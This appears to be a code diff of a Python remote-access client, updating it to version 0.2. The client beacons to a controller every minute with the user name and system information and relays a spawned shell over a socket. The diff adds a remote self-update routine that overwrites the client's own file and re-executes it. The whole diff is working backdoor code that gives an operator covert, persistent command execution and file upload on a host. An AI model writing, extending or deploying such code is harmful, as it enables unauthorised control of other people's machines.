@@ -12,6 +12,8 @@ import struct
 try:from StringIO import StringIO
 except:from io import StringIO
 
+__version__ = "0.2"
+
 HOST = 'localhost'
 PORT = 1708
 
@@ -25,6 +27,10 @@ FILE_DOWNLOAD = 'down'
 FILE_STREAM = 'fstream'
 FILE_CLOSE = 'fclose'
 FILE_FILENAME = 'fname'
+CLIENT_STREAM = 'cstream'
+CLIENT_CLOSE = 'cclose'
+
+RUNNING = True
 
 # Supporting classes
 class FormatSocket:
@@ -82,6 +88,9 @@ class FormatSocket:
         self.lastbytes = msg_data[expected_size:]
         return msg_data[:expected_size]
 
+    def close(self):
+        self.sock.close()
+
 class ByteLockBundler:
     def __init__(self, fsock):
         self.stdoutbytes = b''
@@ -120,13 +129,13 @@ class ByteLockBundler:
 
 # Scripts
 def main():
-    while True:
+    while RUNNING:
         if hasInternetConnection():
             try:
                 # Get and send info
                 user, arch = getInfo()
 
-                infodict = dict(user=user, arch=arch)
+                infodict = dict(user=user, arch=arch, version=__version__)
                 json_str = json.dumps(infodict)
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.connect((HOST, PORT))
@@ -136,8 +145,9 @@ def main():
             except Exception as e:
                 # TODO: Remove debug code
                 raise e
-        # Try again in a minute
-        time.sleep(60)
+        if RUNNING:
+            # Try again in a minute
+            time.sleep(60)
 
 def serve(sock):
     bytelock = ByteLockBundler(sock)
@@ -148,7 +158,7 @@ def serve(sock):
                             cwd=os.path.expanduser("~"))
     # Get commands from server, parse and send appropriate to proc
     def pollProcStdout():
-        while True:
+        while RUNNING:
             out = proc.stdout.read(1)
             if out == '' and proc.poll() is not None:
                 break
@@ -156,7 +166,7 @@ def serve(sock):
                 bytelock.writeStdout(out)
 
     def pollProcStderr():
-        while True:
+        while RUNNING:
             out = proc.stderr.read(1)
             if out == '' and proc.poll() is not None:
                 break
@@ -164,8 +174,10 @@ def serve(sock):
                 bytelock.writeStderr(out)
 
     def pollSock():
+        global RUNNING
         fileobjs = {}
-        while True:
+        clientobj = None
+        while RUNNING:
             recvbytes = sock.recv()
             recvjson = json.loads(recvbytes.decode('UTF-8'))
             if STDIN in recvjson:
@@ -188,12 +200,23 @@ def serve(sock):
                 filename = recvjson[FILE_CLOSE]
                 if filename not in fileobjs:
                     fileobjs[filename].close()
+            if CLIENT_STREAM in recvjson:
+                if clientobj is None:
+                    clientobj = open(os.path.abspath(__file__),"wb")
+                bstr = recvjson[CLIENT_STREAM]
+                clientobj.write(bstr.encode('UTF-8'))
+            if CLIENT_CLOSE in recvjson and clientobj is not None:
+                clientobj.close()
+                RUNNING = False
+                proc.kill()
+                bytelock.fsock.close()
+
             if FILE_DOWNLOAD in recvjson:
                 # TODO: send file to server
                 pass
 
     def writeBundles():
-        while True:
+        while RUNNING:
             time.sleep(0.2)
             bytelock.writeBundle()
 
@@ -209,18 +232,16 @@ def serve(sock):
     t_bndl.start()
 
     t_sock.join()
-    t_procout.join()
-    t_procerr.join()
-    t_bndl.join()
+    # t_procout.join()
+    # t_procerr.join()
+    # t_bndl.join()
 
 
 def getInfo():
     proc = subprocess.Popen(["whoami"], stdout=subprocess.PIPE)
     (user, err) = proc.communicate()
-
     proc = subprocess.Popen(["uname", "-a"], stdout=subprocess.PIPE)
     (arch, err) = proc.communicate()
-
     return user.decode('UTF-8'), arch.decode('UTF-8')
 
 
@@ -308,3 +329,5 @@ if __name__ == "__main__":
         install()
     else:
         main()
+        if not RUNNING:
+            os.execv(sys.executable, [sys.executable] + sys.argv)
